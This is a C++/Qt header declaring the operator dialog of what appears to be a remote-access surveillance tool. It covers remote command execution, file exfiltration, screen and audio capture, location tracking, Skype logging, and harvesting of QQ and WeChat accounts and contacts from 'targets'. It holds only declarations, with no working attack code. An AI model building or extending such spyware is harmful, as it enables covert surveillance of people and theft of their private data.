/*!
	Description : 目标控制界面
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:

			>> 2013.12.10  添加文件监控消息
*/

#ifndef TARGETDLG_H
#define TARGETDLG_H

#include <QtGui>
#include <windows.h>
#include <string>
#include <map>
#include "ui_targetdlg.h"

#include "target.h"
#include "pagetablewidget.h"
#include "waitdlg.h"

#define NETWORK_NOT_INUSE           0
#define NETWORK_WIFI_INUSE          1
#define NETWORK_3G_INUSE            2

#define WM_SET_TAR_STATUSINFO_W         (WM_APP + 300)

#define WM_NEW_FILETASK                 (WM_APP + 400)
#define WM_UPT_FILETASK_STATUS          (WM_APP + 401)
#define WM_UPT_FILETASK_PROGRESS        (WM_APP + 402)

#define WM_NEW_DIRTASK                  (WM_APP + 410)
#define WM_UPT_DIRTASK_STATUS           (WM_APP + 411)
#define WM_UPT_DIRTASK_STATISTIC        (WM_APP + 412)

#define WM_NEW_SEARCHTASK               (WM_APP + 420)
#define WM_UPT_SEARCHTASK_STATUS        (WM_APP + 421)

#define WM_FILETASK_FINISHED            (WM_APP + 430)

#define WM_UPDATE_USB_FILE              (WM_APP + 500)
#define WM_UPDATE_USB_OP                (WM_APP + 501)
#define WM_UPDATE_HTTPS                 (WM_APP + 502)
#define WM_UPDATE_SCREEN                (WM_APP + 503)
#define WM_UPDATE_LIRINFO               (WM_APP + 604)
#define WM_UPDATE_DIRINFO               (WM_APP + 605)
#define WM_UPDATE_SEARCHINFO            (WM_APP + 606)

#define WM_REMOTERUN_REDIRECT           (WM_APP + 601)
#define WM_REMOTERUN_OUTPUT             (WM_APP + 602)
#define WM_REMOTERUN_FINISHED           (WM_APP + 603)

#define WM_ONLINESEARCH_FOUND_BLOCK     (WM_APP + 701)
#define WM_ONLINESEARCH_FINISHED        (WM_APP + 702)
#define WM_ONLINESEARCH_ERRORED         (WM_APP + 703)

#define WM_CAPFULLSCREEN_FINISHED       (WM_APP + 705)

#define WM_FILEMONITOR_FINISHED			(WM_APP + 706)
#define WM_FILEMONITOR_CHANGED			(WM_APP + 707)

#define WM_NEW_LOCATION					(WM_APP + 708)

#define WM_NEW_SKYPE_RECORD				(WM_APP + 709)

#define WM_NEW_PLUGIN_DATA				(WM_APP + 800)
#define WM_NEW_THIRD_PLUGIN_FILE		(WM_APP + 900)

#define WM_APP_INFO_FINISHED			(WM_APP + 901)

#define WM_APP_QQ_ACCOUNT				(WM_APP + 910)
#define WM_APP_QQ_FRIEND				(WM_APP + 911)
#define WM_APP_QQ_TROOP					(WM_APP + 912)

#define WM_APP_WEIXIN_ACCOUNT			(WM_APP + 920)
#define WM_APP_WEIXIN_FRIEND			(WM_APP + 921)

#define GET_DIR_INFO_FIRST				0xFFFFFFFF
#define GET_DIR_INFO_AGAIN				0xEEEEEEEE

#define WM_NEW_BACKSOUND				(WM_APP + 1024)

typedef struct _CHG_INFO
{
	std::wstring remark;
	LONGLONG dwTime;
}CHG_INFO, *PCHG_INFO;


class Target;
class QAxWidget;
class CaptureDlg;
class LogDetailDlg;
class UserActionDlg;
class MultimediaDlg;
class FileCtrlDlg;
class RemoteCmdDlg;
class AdvanceMonitorDlg;
class MapInfoDlg;
class ThirdPluginDlg;
class AppInfoDlg;
class RecordDlg;

class TargetDlg : public QWidget
{
	Q_OBJECT

public:

	static const wchar_t* Net_description[5];

	// 枚举定义
	enum MONITOR_STATUS{NOT_MONITORED=0, MONITORING=1};

	// 构造函数
	TargetDlg(Target* target);

	// 析构函数
	~TargetDlg();

signals:
	void emitModifyCapturePolicy(unsigned int pTarget, int);
	void emitRefreshOnlineLogInfo();

public:
	
	// 设置当前 tab 页
	void SetCurrentTab(QString name);

	// 目标上线
	void TargetOnline();

	// 目标下线
	void TargetOffline();

	void UpdateCapturePolicy();

	void RefreshOnlineLogInfo();

protected:

	// 界面显示之前会调用此函数
	void showEvent(QShowEvent *e);

	// 接管 windows 消息
	bool winEvent(MSG *msg, long *result);

public slots:

	// 获取应用数据 (微信，qq）
	void GetAppData();

	void CleanAppData();

	void ExportAppData();

	void ModifyCapturePolicy();

private slots:

	// 分发各 tab 页的初始化函数
	void DispatchTabInit(int index);

	// 进入本地数据目录
	void onCmbLocalDirIndexChanged(int index);

	// 点击工具栏按钮
	void onToolBarButtonClicked();

	///////////////////////////////////////////////

	//
	//  任务状态
	//

	// 选择文件传输指令
	void onTrMissionStatusItemClicked(QTreeWidgetItem* item, int column);

	// '继续'
	void onBtnCountinueClicked();

	// '暂停'
	void onBtnPauseClicked();

	// '取消'
	void onBtnCancelClicked();

	// 点击目录下载列表中的 item
	void onDirDownloadItemClicked(QTableWidgetItem* item);


public slots:
	


private:

	// 界面外观微调
	void InitWidgetAppearance();

	// 由 tab 名得到 index
	int GetTabIndexFromName(QString name);

	// 初始化 signal & slot
	void InitConnection();

	// 初始化本地数据目录列表
	void InitLocalDataDirList();

	// 初始化文件控制
	void InitFileCtrl();

	// 初始化控制台
	void InitRemoteCmd();

	// 初始化任务状态
	void InitTaskStatus();

	// 初始化屏幕截图
	void InitScreenshot();

	// 初始化音视频监控
	void InitMultimedia();

	// 初始化用户行为监控
	void InitUserActionMonitor();

	// 初始化高级文件监控
	void InitAdvanceFileMonitor();

	// 初始化上下线日志
	void InitLogInfo();

	// 初始化地图
	void InitMapInfo();

	// 初始化应用取证
	void InitAppInfo();

	// 初始化第三方插件管理
	void InitThirdPlugin();

	// 初始化设备录音
	void InitRecordInfo();

	////////////////////////////////////////

	//
	// 任务状态
	//

	// 获取当前任务列表
	QTableWidget* GetActiveFTListView();

	// 添加任务至列表
	void AddFileTaskToListView(FileTask* fileTask);

	// 添加文件任务至列表
	QTableWidgetItem* AddFileDataTaskToListView(FileTask *fileTask, QTableWidget* list);

	// 查询文件任务所对应的 item
	QTableWidgetItem* QueryFileTaskListItem(FileTask *fileTask, int* lpnDaeIndex,int* lpnFinIndex);

	// 添加目录任务至列表
	void AddDirTaskToListView(DirTask *dirTask);

	// 添加目录信息获取任务至列表
	QTableWidgetItem* AddDirInfoTaskToListView(DirTask *dirTask);

	// 添加目录下载任务至列表
	QTableWidgetItem* AddDirDownTaskToListView(DirTask *dirTask);

	// 添加插件数据回传任务至列表
	QTableWidgetItem* AddPluginDataTaskToListView(FileTask* fileTask);

	// 添加插件升级任务至列表
	QTableWidgetItem* AddPluginUptTaskToListView(FileTask* fileTask);

	// 添加搜索任务至列表
	void AddSearchTaskToListView(SearchTask *searchTask);

	// 重新获取短信记录、通话记录
	void UpdatePhoneRecord();

	// 初始化任务列表
	void InitTaskList();

	////////////////////////////////////////

	//
	// 消息响应函数
	//

	// 设置状态栏信息
	void on_WM_SET_TAR_STATUSINFO_W(MSG* msg);

	// 新的文件任务
	void on_WM_NEW_FILETASK(MSG* msg);

	// 更新文件任务状态
	void on_WM_UPT_FILETASK_STATUS(MSG* msg);

	// 更新文件任务进度
	void on_WM_UPT_FILETASK_PROGRESS(MSG* msg);

	// 新的目录任务
	void on_WM_NEW_DIRTASK(MSG* msg);

	// 更新目录任务状态
	void on_WM_UPT_DIRTASK_STATUS(MSG* msg);

	// 更新目录任务统计
	void on_WM_UPT_DIRTASK_STATISTIC(MSG* msg);

	// 新的搜索任务
	void on_WM_NEW_SEARCHTASK(MSG* msg);

	// 更新搜索任务状态
	void on_WM_UPT_SEARCHTASK_STATUS(MSG* msg);

	// 文件任务结束
	void on_WM_FILETASK_FINISHED(MSG* msg);

	// 更新 USB 文件
	void on_WM_UPDATE_USB_FILE(MSG* msg);

	// 更新 USB op
	void on_WM_UPDATE_USB_OP(MSG* msg);

	// 更新 https
	void on_WM_UPDATE_HTTPS(MSG* msg);

	// 更新截屏
	void on_WM_UPDATE_SCREEN(MSG* msg);

	// 更新磁盘列表
	void on_WM_UPDATE_LIRINFO(MSG* msg);

	// 更新目录列表
	void on_WM_UPDATE_DIRINFO(MSG* msg);

	// 更新搜索信息
	void on_WM_UPDATE_SEARCHINFO(MSG* msg);

	// 远程执行
	void on_WM_REMOTERUN_REDIRECT(MSG* msg);

	// 远程执行输出
	void on_WM_REMOTERUN_OUTPUT(MSG* msg);

	// 远程执行结束
	void on_WM_REMOTERUN_FINISHED(MSG* msg);

	// 在线搜索 -> found block
	void on_WM_ONLINESEARCH_FOUND_BLOCK(MSG* msg);

	// 在线搜索结束
	void on_WM_ONLINESEARCH_FINISHED(MSG* msg);

	// 在线搜索错误
	void on_WM_ONLINESEARCH_ERRORED(MSG* msg);

	// 截屏结束
	void on_WM_CAPFULLSCREEN_FINISHED(MSG* msg);

	// 成功添加文件监视
	void on_WM_FILEMONITOR_FINISHED(MSG* msg);

	// 文件状态改变
	void on_WM_FILEMONITOR_CHANGED(MSG* msg);

	// 获取到新的 location
	void on_WM_NEW_LOCATION(MSG* msg);

	// 新的 Skype 监控记录
	void on_WM_NEW_SKYPE_RECORD(MSG* msg);

	// 新的插件数据
	void on_WM_NEW_PLUGIN_DATA(MSG* msg);

	// 新的第三方插件数据
	void on_WM_NEW_THIRD_PLUGIN_FILE(MSG* msg);

	// 新的录音
	void on_WM_NEW_BACKSOUND(MSG* msg);

	// 应用取证获取完毕
	void on_WM_APP_INFO_FINISHED(MSG* msg);

	// 添加 qq 账号
	void on_WM_APP_QQ_ACCOUNT(MSG* msg);

	// 添加 qq 好友
	void on_WM_APP_QQ_FRIEND(MSG* msg);

	// 添加 qq 群
	void on_WM_APP_QQ_TROOP(MSG* msg);

	// 添加微信账号
	void on_WM_APP_WEIXIN_ACCOUNT(MSG* msg);

	// 添加微信好友
	void on_WM_APP_WEIXIN_FRIEND(MSG* msg);



private:
	Ui::TargetDlg ui;

public:

	// 窗口句柄
	HWND Handle;

	Target        *tarBlock;
	DWORD          dwTargetId;

	bool           bShowFlag;               // 总界面能否显示
	int            nDirLastError;

private:

	bool            bDirDetailSelected;     // 对于目录下载，表明是复合指令还是子指令被选中


	// GUI 初始化标志
	//
	bool            bTaskManager;
	bool            bFileControl;
	bool            bAdvanceFileMonitor;
	bool            bUserAction;
	bool            bCmdConsole;
	bool            bHttps;
	bool            bLogInfo;
	bool            bScreen;
	bool			bMapInfo;
	bool			bAppInfo;
	bool			bThirdPlugin;
	bool			bMultimedia;
	bool			bRecord;

	// 监控的文件类型
	std::wstring	m_curMonitorType;

	CaptureDlg* m_captureDlg;
	LogDetailDlg* m_logDetailDlg;
	UserActionDlg* m_userActionDlg;
	MultimediaDlg* m_multimediaDlg;
	FileCtrlDlg* m_fileCtrlDlg;
	RemoteCmdDlg* m_remoteCmdDlg;
	AppInfoDlg* m_appInfoDlg;
	AdvanceMonitorDlg* m_advanceMonitorDlg;
	MapInfoDlg* m_mapInfoDlg;
	ThirdPluginDlg* m_thirdPluginDlg;
	RecordDlg* m_recordDlg;
};

#endif // TARGETDLG_H
